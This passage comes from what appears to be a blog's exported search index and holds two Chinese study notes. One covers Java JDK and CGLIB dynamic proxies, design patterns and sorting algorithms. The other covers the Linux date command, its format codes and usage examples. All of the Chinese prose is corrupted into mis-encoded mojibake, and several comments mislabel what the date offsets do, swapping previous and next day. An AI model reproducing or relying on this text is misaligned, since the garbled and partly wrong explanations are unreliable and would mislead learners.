åŠ¡æ¥å£çš„è¯å°±è¦å®šä¹‰å¾ˆå¤šå®ç°ç±»å’Œä»£ç†ç±»æ‰è¡Œã€‚ â€¦ 2. åŠ¨æ€ä»£ç†ç¬¬ä¸€ç§ï¼šJDK åŠ¨æ€ä»£ç†å®ç° JDK åŠ¨æ€ä»£ç†æ‰€ç”¨åˆ°çš„ä»£ç†ç±»åœ¨ç¨‹åºè°ƒç”¨åˆ°ä»£ç†ç±»å¯¹è±¡æ—¶æ‰ç”± JVM çœŸæ­£åˆ›å»ºï¼ŒJVM æ ¹æ®ä¼  è¿›æ¥çš„ä¸šåŠ¡å®ç°ç±»å¯¹è±¡ä»¥åŠæ–¹æ³•åï¼ŒåŠ¨æ€åœ°åˆ›å»ºäº†ä¸€ä¸ªä»£ç†ç±»çš„ class æ–‡ä»¶å¹¶è¢«å­—èŠ‚ç å¼•æ“ æ‰§è¡Œï¼Œç„¶åé€šè¿‡è¯¥ä»£ç†ç±»å¯¹è±¡è¿›è¡Œæ–¹æ³•è°ƒç”¨ã€‚æˆ‘ä»¬éœ€è¦åšçš„ï¼Œåªéœ€æŒ‡å®šä»£ç†ç±»çš„é¢„å¤„ç†ã€ è°ƒç”¨åæ“ä½œå³å¯ã€‚ åªèƒ½å¯¹å®ç°äº†æ¥å£çš„ç±»ç”Ÿæˆä»£ç†ï¼Œè€Œä¸æ˜¯é’ˆå¯¹ç±»ï¼Œè¯¥ç›®æ ‡ç±»å‹å®ç°çš„æ¥å£éƒ½å°†è¢«ä»£ç†ã€‚åŸç† æ˜¯é€šè¿‡åœ¨è¿è¡ŒæœŸé—´åˆ›å»ºä¸€ä¸ªæ¥å£çš„å®ç°ç±»æ¥å®Œæˆå¯¹ç›®æ ‡å¯¹è±¡çš„ä»£ç†ã€‚å…·ä½“å®ç°æ­¥éª¤ï¼š å®šä¹‰ä¸€ä¸ªå®ç°æ¥å£ InvocationHandler çš„ç±» é€šè¿‡æ„é€ å‡½æ•°æˆ–è€…é™æ€å·¥å‚æ–¹æ³•ç­‰ï¼Œæ³¨å…¥è¢«ä»£ç†ç±» å®ç° invoke(Object proxy, Method method, Object[] args)æ–¹æ³• åœ¨ä¸»å‡½æ•°ä¸­è·å¾—è¢«ä»£ç†ç±»çš„ç±»åŠ è½½å™¨ ä½¿ç”¨ Proxy.newProxyInstance(classLoader, interfaces, args)äº§ç”Ÿä¸€ä¸ªä»£ç†å¯¹è±¡ é€šè¿‡ä»£ç†å¯¹è±¡è°ƒç”¨å„ç§æ–¹æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859=============//å®ç°InvocationHandler====================import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;/** * @author shixuanji * åŠ¨æ€ä»£ç†: JDK * 1. å®ç°ä¸€ä¸ªæ¥å£ InvocationHandler * 2. å°†ä»£ç†å¯¹è±¡ä½œä¸ºå±æ€§ä¼ å…¥ ä»£ç†æ‰€æœ‰çš„ç±» * 3. é‡å†™ invoke()æ–¹æ³• * */public class ProxyDynamicStudentDao implements InvocationHandler &#123; private Object o; public ProxyDynamicStudentDao(Object o) &#123; this.o = o; &#125; /* * @param proxy: ä»£ç†å¯¹è±¡, åŸºæœ¬ä¸ç”¨ ???åº”è¯¥æ˜¯ä»£ç†å¯¹è±¡æŠŠ, è€å¸ˆå†™çš„è¢«ä»£ç†å¯¹è±¡ * @param method: æ‹¦æˆªä¸‹æ¥çš„è¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³• - åå°„ä¸­æè¿°æ–¹æ³•çš„ç±» * @param args: è¢«ä»£ç†å¯¹è±¡ä¸šåŠ¡æ–¹æ³•çš„å‚æ•° */ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; String methodName = method.getName().toString(); if (methodName.equals("insert")) &#123; // xxx &#125; else &#123; //ssssss &#125; // åšçš„äº‹æƒ…å°±æ˜¯å¯¹ä»£ç†æ–¹æ³•çš„æ–¹æ³•çš„å¢å¼º // å¢å¼º System.out.println("å¼€å§‹æ‰§è¡Œ"); // ä¸šåŠ¡æ–¹æ³•è°ƒç”¨, ä¸€å®šè¦è°ƒç”¨è¢«ä»£ç†å¯¹è±¡çš„ // obj: å¯¹è±¡ // args:æ–¹æ³•çš„å‚æ•° Object res = method.invoke(o, args); // å¢å¼º System.out.println("æ‰§è¡Œå®Œäº†"); return res; &#125;&#125;============== // ä½¿ç”¨========================/*** å‚æ•°1: è¢«ä»£ç†å¯¹è±¡çš„ç±»åŠ è½½å™¨ * å‚æ•°2: è¦å®ç°çš„æ¥å£* å‚æ•°3: ä»£ç†ç±»å¯¹è±¡ * * èƒ½.å‡ºæ¥ä»€ä¹ˆçœ‹ å·¦è¾¹æ¥æ”¶ç€* è¿è¡Œæ—¶çœ‹ çœŸæ­£åˆ›å»ºçš„å¯¹è±¡*/// ç›®å‰çœ‹æ¥ ä»£ç†å®ä¾‹åªèƒ½æ˜¯æ¥å£BaseDAO newProxyInstance = (BaseDAO)Proxy.newProxyInstance(StudentDAO.class.getClassLoader(), StudentDAO.class.getInterfaces(), new ProxyDynamicStudentDao(new StudentDAO()));newProxyInstance.insert(new Teacher()); ç¬¬äºŒç§ï¼šCGLIB åŠ¨æ€ä»£ç†å®ç°ï¼š CGLIB æ˜¯é’ˆå¯¹ç±»æ¥å®ç°ä»£ç†çš„ï¼ŒåŸç†æ˜¯å¯¹æŒ‡å®šçš„ä¸šåŠ¡ç±»ç”Ÿæˆä¸€ä¸ªå­ç±»ï¼Œå¹¶è¦†ç›–å…¶ä¸­ä¸šåŠ¡æ–¹æ³• å®ç°ä»£ç†ã€‚å› ä¸ºé‡‡ç”¨çš„æ˜¯ç»§æ‰¿ï¼Œæ‰€ä»¥ä¸èƒ½å¯¹ final ä¿®é¥°çš„ç±»è¿›è¡Œä»£ç†ï¼Œfinal çš„æ–¹æ³•ä¹Ÿä¸èƒ½ é’ˆå¯¹ç±»å®ç°ä»£ç†ï¼Œå¯¹æ˜¯å¦å®ç°æ¥å£æ— è¦æ±‚ã€‚åŸç†æ˜¯å¯¹æŒ‡å®šçš„ç±»ç”Ÿæˆä¸€ä¸ªå­ç±»ï¼Œè¦†ç›–å…¶ä¸­çš„æ–¹ æ³•ï¼Œå› ä¸ºæ˜¯ç»§æ‰¿ï¼Œæ‰€ä»¥è¢«ä»£ç†çš„ç±»æˆ–æ–¹æ³•æœ€å¥½ä¸è¦å£°æ˜ä¸º final ç±»å‹ã€‚å…·ä½“å®ç°æ­¥éª¤ï¼š 1ã€å®šä¹‰ä¸€ä¸ªå®ç°äº† MethodInterceptor æ¥å£çš„ç±» 2ã€å®ç°å…¶ intercept()æ–¹æ³•ï¼Œåœ¨å…¶ä¸­è°ƒç”¨ proxy.invokeSuper() 3. é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†çš„åŒºåˆ«é™æ€ä»£ç†ï¼šè‡ªå·±ç¼–å†™åˆ›å»ºä»£ç†ç±»ï¼Œç„¶åå†è¿›è¡Œç¼–è¯‘ï¼Œåœ¨ç¨‹åºè¿è¡Œå‰ï¼Œä»£ç†ç±»çš„.class æ–‡ä»¶å°± å·²ç»å­˜åœ¨äº†ã€‚ åŠ¨æ€ä»£ç†ï¼šåœ¨å®ç°é˜¶æ®µä¸ç”¨å…³å¿ƒä»£ç†è°ï¼Œè€Œåœ¨è¿è¡Œé˜¶æ®µï¼ˆé€šè¿‡åå°„æœºåˆ¶ï¼‰æ‰æŒ‡å®šä»£ç†å“ªä¸€ä¸ª å¯¹è±¡ã€‚ 3.4 é‡ç‚¹æŒæ¡3.4.1. è£…é¥°è€…æ¨¡å¼ å’Œ é™æ€ä»£ç†æ¨¡å¼ åŒºåˆ«åœ¨ä»£ç ä¸Šçš„åŒºåˆ«: ä¸€èˆ¬æƒ…å†µä¸‹, è£…é¥°è€…æ¨¡å¼è¢«è£…é¥°çš„å¯¹è±¡ä¸€èˆ¬æ˜¯ä»å¤–éƒ¨ä¼ å…¥, è£…é¥°çš„æ˜¯ä¸€ç±»çš„äº‹åŠ¡, åªè¦æ˜¯æŸä¸€ç±»çš„(Class)éƒ½å¯ä»¥ é™æ€ä»£ç†æ¨¡å¼è¢«ä»£ç†å¯¹è±¡çš„åˆå§‹åŒ–ä¸€èˆ¬æ˜¯å†…éƒ¨åˆ›å»ºçš„, ä»£ç†çš„æ˜¯ä¸€ä¸ªç±»çš„å¯¹è±¡. ä»åŠŸèƒ½ä¸Š: è£…é¥°è€…æ¨¡å¼, ç”¨äºå¯¹è¢«è£…é¥°è€…ä¸šåŠ¡é€»è¾‘å®ç°æˆ–å¢å¼º, å¯¹æ–¹æ³•åæ²¡æœ‰è¦æ±‚ é™æ€ä»£ç†: ä¸»è¦ç”¨äºæƒé™æ§åˆ¶, æ—¥å¿—æ‰“å°, é”™è¯¯é¢„è­¦ç­‰åŠŸèƒ½ 3.4.2. ä¸‰ç§è®¾è®¡æ¨¡å¼å¿…é¡»æŒæ¡çš„ å•ä¾‹è®¾è®¡æ¨¡å¼ è£…é¥°è€…æ¨¡å¼ åŠ¨æ€ä»£ç†æ¨¡å¼ 3.4.3. æ‰‹å†™ä»£ç  å†’æ³¡æ’åº å¿«é€Ÿæ’åº è®¾è®¡æ¨¡å¼ hadoop çš„ wordcount scala çš„ wordcount spark çš„ wordcount 4. æ’åºç®—æ³• æ ¸å¿ƒæ¦‚å¿µï¼šç®—æ³•å¤æ‚åº¦ã€ç¨³å®šæ€§ ç®—æ³•å¤æ‚åº¦ï¼šç®—æ³•å¤æ‚åº¦æ˜¯æŒ‡ç®—æ³•åœ¨ç¼–å†™æˆå¯æ‰§è¡Œç¨‹åºåï¼Œè¿è¡Œæ—¶æ‰€éœ€è¦çš„èµ„æºï¼Œèµ„æºåŒ…æ‹¬ æ—¶é—´èµ„æºå’Œå†…å­˜èµ„æºã€‚åº”ç”¨äºæ•°å­¦å’Œè®¡ç®—æœºå¯¼è®ºã€‚ ç¨³å®šæ€§ï¼šä¸€ä¸ªæ’åºç®—æ³•æ˜¯ç¨³å®šçš„ï¼Œå°±æ˜¯å½“æœ‰ä¸¤ä¸ªç›¸ç­‰è®°å½•çš„å…³é”®å­— R å’Œ Sï¼Œä¸”åœ¨åŸæœ¬çš„åˆ—è¡¨ ä¸­ R å‡ºç°åœ¨ S ä¹‹å‰ï¼Œåœ¨æ’åºè¿‡çš„åˆ—è¡¨ä¸­ R ä¹Ÿå°†ä¼šæ˜¯åœ¨ S ä¹‹å‰ã€‚ 4.1. æ’åºåˆ†ç±»æŒ‰ç…§æ’åºç»“æœæ˜¯å¦ç¨³å®šæ€§åˆ†ç±»ï¼š ç¨³å®šæ’åºï¼šæ’å…¥æ’åºï¼Œå†’æ³¡æ’åºï¼Œå½’å¹¶æ’åºï¼Œè®¡æ•°æ’åºï¼ŒåŸºæ•°æ’åºï¼Œæ¡¶æ’åºï¼ˆå¦‚æœæ¡¶å†… æ’åºé‡‡ç”¨çš„æ˜¯ç¨³å®šæ€§æ’åºï¼‰ éç¨³å®šæ’åºï¼šé€‰æ‹©æ’åºï¼Œå¿«é€Ÿæ’åºï¼Œå †æ’åºã€‚ æŒ‰ç…§æ’åºè¿‡ç¨‹ä¸­æ˜¯å¦éœ€è¦é¢å¤–ç©ºé—´ï¼š åŸåœ°æ’åºï¼šæ’å…¥æ’åºï¼Œé€‰æ‹©æ’åºï¼Œå†’æ³¡æ’åºï¼Œå¿«é€Ÿæ’åºï¼Œå †æ’åºã€‚ éåŸåœ°æ’åºï¼šå½’å¹¶æ’åºï¼Œè®¡æ•°æ’åºï¼ŒåŸºæ•°æ’åºï¼Œæ¡¶æ’åºã€‚ æŒ‰ç…§æ’åºçš„ä¸»è¦æ“ä½œåˆ†ç±»ï¼š äº¤æ¢ç±»ï¼šå†’æ³¡æ’åºã€å¿«é€Ÿæ’åºï¼›æ­¤ç±»çš„ç‰¹ç‚¹æ˜¯é€šè¿‡ä¸æ–­çš„æ¯”è¾ƒå’Œäº¤æ¢è¿›è¡Œæ’åºï¼› æ’å…¥ç±»ï¼šç®€å•æ’å…¥æ’åºã€å¸Œå°”æ’åºï¼›æ­¤ç±»çš„ç‰¹ç‚¹æ˜¯é€šè¿‡æ’å…¥çš„æ‰‹æ®µè¿›è¡Œæ’åºï¼› é€‰æ‹©ç±»ï¼šç®€å•é€‰æ‹©æ’åºã€å †æ’åºï¼›æ­¤ç±»çš„ç‰¹ç‚¹æ˜¯çœ‹å‡†äº†å†ç§»åŠ¨ï¼› å½’å¹¶ç±»ï¼šå½’å¹¶æ’åºï¼›æ­¤ç±»çš„ç‰¹ç‚¹æ˜¯å…ˆåˆ†å‰²ååˆå¹¶ï¼› æŒ‰ç…§æ˜¯å¦éœ€è¦æ¯”è¾ƒåˆ†ç±»ï¼š æ¯”è¾ƒæ’åºï¼Œæ—¶é—´å¤æ‚åº¦ O(nlogn) ~ O(n^2)ï¼Œä¸»è¦æœ‰ï¼šå†’æ³¡æ’åºï¼Œé€‰æ‹©æ’åºï¼Œæ’å…¥æ’åºï¼Œ å½’å¹¶æ’åºï¼Œå †æ’åºï¼Œå¿«é€Ÿæ’åºç­‰ã€‚ éæ¯”è¾ƒæ’åºï¼Œæ—¶é—´å¤æ‚åº¦å¯ä»¥è¾¾åˆ° O(n)ï¼Œä¸»è¦æœ‰ï¼šè®¡æ•°æ’åºï¼ŒåŸºæ•°æ’åºï¼Œæ¡¶æ’åºç­‰ã€‚ 4.2 å¸¸è§æ’åºçš„æ—¶é—´å¤æ‚åº¦ æœ‰è¶£çš„æ’åºç®—æ³•è§†é¢‘ 4.3 å¸¸è§æ’åºç®—æ³•çš„æ ¸å¿ƒå®ç°4.3.1 å†’æ³¡æ’åº 4.3.2 å½’å¹¶æ’åº 4.3.3 å¿«é€Ÿæ’åº]]></content>
      <categories>
        <category>Java</category>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxå­¦ä¹ ç¬”è®°-5]]></title>
    <url>%2F2018%2F05%2F28%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5%2F</url>
    <content type="text"><![CDATA[1.Shellæ“ä½œæ—¥æœŸæ—¶é—´dateåœ¨ç±»UNIXç³»ç»Ÿä¸­ï¼Œæ—¥æœŸè¢«å­˜å‚¨ä¸ºä¸€ä¸ªæ•´æ•°ï¼Œå…¶å¤§å°ä¸ºè‡ªä¸–ç•Œæ ‡å‡†æ—¶é—´ï¼ˆUTCï¼‰1970å¹´1æœˆ1æ—¥0æ—¶0åˆ†0ç§’èµ·æµé€çš„ç§’æ•°ã€‚ è¯­æ³• 1date(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ 12345-d&lt;å­—ç¬¦ä¸²&gt;ï¼šæ˜¾ç¤ºå­—ç¬¦ä¸²æ‰€æŒ‡çš„æ—¥æœŸä¸æ—¶é—´ã€‚å­—ç¬¦ä¸²å‰åå¿…é¡»åŠ ä¸ŠåŒå¼•å·ï¼›-s&lt;å­—ç¬¦ä¸²&gt;ï¼šæ ¹æ®å­—ç¬¦ä¸²æ¥è®¾ç½®æ—¥æœŸä¸æ—¶é—´ã€‚å­—ç¬¦ä¸²å‰åå¿…é¡»åŠ ä¸ŠåŒå¼•å·ï¼›-uï¼šæ˜¾ç¤ºGMT, å³ç›®å‰çš„æ ¼æ—å¨æ²»æ—¶é—´ï¼›--helpï¼šåœ¨çº¿å¸®åŠ©ï¼›--versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ å‚æ•° &lt;+æ—¶é—´æ—¥æœŸæ ¼å¼&gt;ï¼šæŒ‡å®šæ˜¾ç¤ºæ—¶ä½¿ç”¨çš„æ—¥æœŸæ—¶é—´æ ¼å¼ã€‚ æ—¥æœŸæ ¼å¼å­—ç¬¦ä¸²åˆ—è¡¨ 123456789101112131415161718192021222324%r æ—¶é—´ï¼Œ12å°æ—¶åˆ¶%s ä»1970å¹´1æœˆ1æ—¥0ç‚¹åˆ°ç›®å‰ç»å†çš„ç§’æ•°%S ç§’ï¼ˆ00ï½59ï¼‰ %T æ—¶é—´ï¼ˆ24å°æ—¶åˆ¶ï¼‰ï¼ˆhh:mm:ssï¼‰%X æ˜¾ç¤ºæ—¶é—´çš„æ ¼å¼ï¼ˆï¼…Hæ—¶ï¼…Måˆ†ï¼…Sç§’ï¼‰%Z æŒ‰å­—æ¯è¡¨æ’åºçš„æ—¶åŒºç¼©å†™%a æ˜ŸæœŸåç¼©å†™%A æ˜ŸæœŸåå…¨ç§°%b æœˆåç¼©å†™%B æœˆåå…¨ç§°%c æ—¥æœŸå’Œæ—¶é—´%d æŒ‰æœˆè®¡çš„æ—¥æœŸï¼ˆ01ï½31ï¼‰%D æ—¥æœŸï¼ˆmm/dd/yyï¼‰ %h å’Œ%bé€‰é¡¹ç›¸åŒ%j ä¸€å¹´çš„ç¬¬å‡ å¤©ï¼ˆ001~366ï¼‰%m æœˆä»½ï¼ˆ01ï½12ï¼‰%w ä¸€ä¸ªæ˜ŸæœŸçš„ç¬¬å‡ å¤©ï¼ˆ0ä»£è¡¨æ˜ŸæœŸå¤©ï¼‰%W ä¸€å¹´çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ˆ00ï½53ï¼Œæ˜ŸæœŸä¸€ä¸ºç¬¬ä¸€å¤©ï¼‰%x æ˜¾ç¤ºæ—¥æœŸçš„æ ¼å¼ï¼ˆmm/dd/yyï¼‰%y å¹´ä»½çš„æœ€åä¸¤ä¸ªæ•°å­—ï¼ˆ1999åˆ™æ˜¯99ï¼‰%Y å¹´ä»½ï¼ˆæ¯”å¦‚1970ã€1996ç­‰ï¼‰%C ä¸–çºªï¼Œé€šå¸¸ä¸ºçœç•¥å½“å‰å¹´ä»½çš„åä¸¤ä½æ•°å­—%U ä¸€å¹´ä¸­çš„ç¬¬å‡ å‘¨ï¼Œä»¥å‘¨æ—¥ä¸ºæ¯æ˜ŸæœŸç¬¬ä¸€å¤©%e æŒ‰æœˆè®¡çš„æ—¥æœŸï¼Œæ·»åŠ ç©ºæ ¼ï¼Œç­‰äº%_d å®ä¾‹ æ ¼å¼åŒ–è¾“å‡º 12date +"%Y-%m-%d"2009-12-07 è¾“å‡ºæ˜¨å¤©æ—¥æœŸï¼š 12date -d "1 day ago" +"%Y-%m-%d"2012-11-19 2ç§’åè¾“å‡ºï¼š 12date -d "2 second" +"%Y-%m-%d %H:%M.%S"2012-11-20 14:21.31 ä¼ è¯´ä¸­çš„ 1234567890 ç§’ï¼š 12date -d "1970-01-01 1234567890 seconds" +"%Y-%m-%d %H:%m:%S"2009-02-13 23:02:30 æ™®é€šè½¬æ ¼å¼ï¼š 12date -d "2009-12-12" +"%Y/%m/%d %H:%M.%S"2009/12/12 00:00.00 apacheæ ¼å¼è½¬æ¢ï¼š 12date -d "Dec 5, 2009 12:00:37 AM" +"%Y-%m-%d %H:%M.%S"2009-12-05 00:00.37 æ ¼å¼è½¬æ¢åæ—¶é—´æ¸¸èµ°ï¼š 12date -d "Dec 5, 2009 12:00:37 AM 2 year ago" +"%Y-%m-%d %H:%M.%S"2007-12-05 00:00.37 åŠ å‡æ“ä½œï¼š 1234567date +%Y%m%d //æ˜¾ç¤ºå‰å¤©å¹´æœˆæ—¥date -d "+1 day" +%Y%m%d //æ˜¾ç¤ºå‰ä¸€å¤©çš„æ—¥æœŸdate -d "-1 day" +%Y%m%d //æ˜¾ç¤ºåä¸€å¤©çš„æ—¥æœŸdate -d "-1 month" +%Y%m%d //æ˜¾ç¤ºä¸Šä¸€æœˆçš„æ—¥æœŸdate -d "+1 month" +%Y%m%d //æ˜¾ç¤ºä¸‹ä¸€æœˆçš„æ—¥æœŸdate -d "-1 year" +%Y%m%d //æ˜¾ç¤ºå‰ä¸€å¹´çš„æ—¥æœŸdate -d "+1 year" +%Y%m%d //æ˜¾ç¤ºä¸‹ä¸€å¹´çš„æ—¥æœŸ è®¾å®šæ—¶é—´ï¼š 1234567date -s //è®¾ç½®å½“å‰æ—¶é—´ï¼Œåªæœ‰rootæƒé™æ‰èƒ½è®¾ç½®ï¼Œå…¶ä»–åªèƒ½æŸ¥çœ‹date -s 20120523 //è®¾ç½®æˆ20120523ï¼Œè¿™æ ·ä¼šæŠŠå…·ä½“æ—¶é—´è®¾ç½®æˆç©º00:00:00date -s 01:01:01 //è®¾ç½®å…·ä½“æ—¶é—´ï¼Œä¸ä¼šå¯¹æ—¥æœŸåšæ›´æ”¹date -s "01:01:01 2012-05-23" //è¿™æ ·å¯ä»¥è®¾ç½®å…¨éƒ¨æ—¶é—´date -s "01:01:01 20120523" //è¿™æ ·å¯ä»¥è®¾ç½®å…¨éƒ¨æ—¶é—´date -s "2012-05-23 01:01:01" //è¿™æ ·å¯ä»¥è®¾ç½®å…¨éƒ¨æ—¶é—´date -s "20120523 01:01:01" //è¿™æ ·å¯ä»¥è®¾ç½®å…¨éƒ¨æ—¶é—´ æœ‰æ—¶éœ€è¦æ£€æŸ¥ä¸€ç»„å‘½ä»¤èŠ±è´¹çš„æ—¶é—´ï¼Œä¸¾ä¾‹ï¼š 12345678#!/bin/bashstart=$(date +%s)nmap man.linuxde.net &amp;&gt; /dev/nullend=$(date +%s)difference=$(( end - start ))echo $difference seconds. è®¡ç®—æ´»äº†å¤šå°‘å¹´ 1echo $[($(date +%s -d $[date])-$(date +%s -d "19900318"))/86400/365] date -då…¶å®ƒçš„ä¸€äº›ç”¨æ³•. 123456789101112131415161718192021222324252627## è·å–ä¸‹ä¸€å¤©çš„æ—¶é—´[root@hadoop ~]# date -d next-day '+%Y-%m-%d %H:%M:%S'[root@hadoop ~]# date -d 'next day' '+%Y-%m-%d %H:%M:%S'å¦å¤–ä¸€ç§å†™æ³•ï¼š[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' -d tomorrow## è·å–ä¸Šä¸€å¤©çš„æ—¶é—´ [root@hadoop ~]# date -d last-day '+%Y-%m-%d %H:%M:%S'å¦å¤–ä¸€ç§å†™æ³•ï¼š[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' -d yesterday## è·å–ä¸‹ä¸€æœˆçš„æ—¶é—´[root@hadoop ~]# date -d next-month '+%Y-%m-%d %H:%M:%S'## è·å–ä¸Šä¸€æœˆçš„æ—¶é—´ [root@hadoop ~]# date -d last-month '+%Y-%m-%d %H:%M:%S'## è·å–ä¸‹ä¸€å¹´çš„æ—¶é—´[root@hadoop ~]# date -d next-year '+%Y-%m-%d %H:%M:%S'## è·å–ä¸Šä¸€å¹´çš„æ—¶é—´ [root@hadoop ~]# date -d last-year '+%Y-%m-%d %H:%M:%S'## è·å–ä¸Šä¸€å‘¨çš„æ—¥æœŸæ—¶é—´ï¼š[root@hadoop ~]# date -d next-week '+%Y-%m-%d %H:%M:%S'[root@hadoop ~]# date -d next-monday '+%Y-%m-%d %H:%M:%S'[root@hadoop ~]# date -d next-thursday '+%Y-%m-%d %H:%M:%S' é‚£ä¹ˆç±»ä¼¼çš„ï¼Œå…¶å®ï¼Œlast-yearï¼Œlast-monthï¼Œlast-dayï¼Œlast-weekï¼Œlast-hourï¼Œlast-minuteï¼Œlast-secondéƒ½æœ‰å¯¹åº”çš„å®ç°ã€‚ç›¸åçš„ï¼Œlastå¯¹åº”nextï¼Œè‡ªå·±å¯ä»¥æ ¹æ®å®é™…æƒ…å†µçµæ´»ç»„ç»‡ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹â€˜â€“dateâ€™ï¼Œå®ƒå¸®æˆ‘å®ç°ä»»æ„æ—¶é—´å‰åçš„è®¡ç®—ï¼Œæ¥çœ‹å…·ä½“çš„ä¾‹å­ï¼š 1234567## è·å–ä¸€å¤©ä»¥åçš„æ—¥æœŸæ—¶é—´[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='1 day'[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='-1 day ago'## è·å–ä¸€å¤©ä»¥å‰çš„æ—¥æœŸæ—¶é—´[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='-1 day'[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='1 day ago' ä¸Šé¢çš„ä¾‹å­æ˜¾ç¤ºå‡ºæ¥äº†ä½¿ç”¨çš„æ ¼å¼ï¼Œä½¿ç”¨ç²¾é«“åœ¨äºæ”¹å˜å‰é¢çš„å­—ç¬¦ä¸²æ˜¾ç¤ºæ ¼å¼ï¼Œæ”¹å˜æ•°æ®ï¼Œæ”¹å˜è¦æ“ä½œçš„æ—¥æœŸå¯¹åº”å­—æ®µï¼Œé™¤äº†å¤©ä¹Ÿæœ‰å¯¹åº”çš„å…¶ä»–å®ç°ï¼šyearï¼Œmonthï¼Œweekï¼Œdayï¼Œhourï¼Œminuteï¼Œsecondï¼Œmondayï¼ˆæ˜ŸæœŸï¼Œä¸ƒå¤©éƒ½å¯ï¼‰ date èƒ½ç”¨æ¥æ˜¾ç¤ºæˆ–è®¾å®šç³»ç»Ÿçš„æ—¥æœŸå’Œæ—¶é—´ï¼Œåœ¨æ˜¾ç¤ºæ–¹é¢ï¼Œä½¿ç”¨è€…èƒ½è®¾å®šæ¬²æ˜¾ç¤ºçš„æ ¼å¼ï¼Œæ ¼å¼è®¾å®šä¸ºä¸€ä¸ªåŠ å·åæ¥æ•°ä¸ªæ ‡è®°ï¼Œå…¶ä¸­å¯ç”¨çš„æ ‡è®°åˆ—è¡¨å¦‚ä¸‹ï¼š ä½¿ç”¨èŒƒä¾‹ï¼š 1[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' æ—¥æœŸæ–¹é¢ 12345678910111213141516%a : æ˜ŸæœŸå‡  (Sun..Sat) %A : æ˜ŸæœŸå‡  (Sunday..Saturday) %b : æœˆä»½ (Jan..Dec) %B : æœˆä»½ (January..December) %c : ç›´æ¥æ˜¾ç¤ºæ—¥æœŸå’Œæ—¶é—´ %d : æ—¥ (01..31) %D : ç›´æ¥æ˜¾ç¤ºæ—¥æœŸ (mm/dd/yy) %h : åŒ %b %j : ä¸€å¹´ä¸­çš„ç¬¬å‡ å¤© (001..366) %m : æœˆä»½ (01..12) %U : ä¸€å¹´ä¸­çš„ç¬¬å‡ å‘¨ (00..53) (ä»¥ Sunday ä¸ºä¸€å‘¨çš„ç¬¬ä¸€å¤©çš„æƒ…å½¢) %w : ä¸€å‘¨ä¸­çš„ç¬¬å‡ å¤© (0..6) %W : ä¸€å¹´ä¸­çš„ç¬¬å‡ å‘¨ (00..53) (ä»¥ Monday ä¸ºä¸€å‘¨çš„ç¬¬ä¸€å¤©çš„æƒ…å½¢) %x : ç›´æ¥æ˜¾ç¤ºæ—¥æœŸ (mm/dd/yyyy) %y : å¹´ä»½çš„æœ€åä¸¤ä½æ•°å­— (00.99) %Y : å®Œæ•´å¹´ä»½ (0000..9999) æ—¶é—´æ–¹é¢ 123456789101112131415%%: æ‰“å°å‡º%%n : ä¸‹ä¸€è¡Œ%t : è·³æ ¼%H : å°æ—¶(00..23)%k : å°æ—¶(0..23)%l : å°æ—¶(1..12)%M : åˆ†é’Ÿ(00..59)%p : æ˜¾ç¤ºæœ¬åœ°AMæˆ–PM%P : æ˜¾ç¤ºæœ¬åœ°amæˆ–pm%r : ç›´æ¥æ˜¾ç¤ºæ—¶é—´(12 å°æ—¶åˆ¶ï¼Œæ ¼å¼ä¸º hh:mm:ss [AP]M)%s : ä» 1970 å¹´ 1 æœˆ 1 æ—¥ 00:00:00 UTC åˆ°ç›®å‰ä¸ºæ­¢çš„ç§’æ•°%S : ç§’(00..61)%T : ç›´æ¥æ˜¾ç¤ºæ—¶é—´(24å°æ—¶åˆ¶)%X : ç›¸å½“äº%H:%M:%S %p%Z : æ˜¾ç¤ºæ—¶åŒº è‹¥æ˜¯ä¸ä»¥åŠ å·ä½œä¸ºå¼€å¤´ï¼Œåˆ™è¡¨ç¤ºè¦è®¾å®šæ—¶é—´ï¼Œè€Œæ—¶é—´æ ¼å¼ä¸º MMDDhhmm[[CC]YY][.ss] 1234567MM ä¸ºæœˆä»½ï¼Œ DD ä¸ºæ—¥ï¼Œhh ä¸ºå°æ—¶ï¼Œmm ä¸ºåˆ†é’Ÿï¼ŒCC ä¸ºå¹´ä»½å‰ä¸¤ä½æ•°å­—ï¼ŒYY ä¸ºå¹´ä»½åä¸¤ä½æ•°å­—ï¼Œss ä¸ºç§’æ•° æœ‰ç”¨çš„å°æŠ€å·§12345678910111213141516171819202122## è·å–ç›¸å¯¹æŸä¸ªæ—¥æœŸå‰åçš„æ—¥æœŸï¼šcts1 ~ # date -d 'may 14 -2 weeks'2018å¹´ 04æœˆ 30æ—¥ æ˜ŸæœŸä¸€ 00:00:00 CST## æŠŠæ—¶é—´å½“ä¸­æ— ç”¨çš„0å»æ‰ï¼Œæ¯”å¦‚ï¼š01:02:25ä¼šå˜æˆ1:2:25cts1 ~ # date '+%-H:%-M:%-S'19:18:22## æ˜¾ç¤ºæ–‡ä»¶æœ€åè¢«æ›´æ”¹çš„æ—¶é—´cts1 ~ # date "+%Y-%m-%d %H:%M:%S" -r install.log2018-05-23 10:11:14## æ±‚ä¸¤ä¸ªå­—ç¬¦ä¸²æ—¥æœŸä¹‹é—´ç›¸éš”çš„å¤©æ•°[root@hadoop ~]# expr '(' $(date +%s -d "2016-08-08") - $(date +%s -d "2016-09-09") ')' / 86400expr `expr $(date +%s -d "2016-08-08") - $(date +%s -d "2016-09-09")` / 86400## shellä¸­åŠ å‡æŒ‡å®šé—´éš”å•ä½cts1 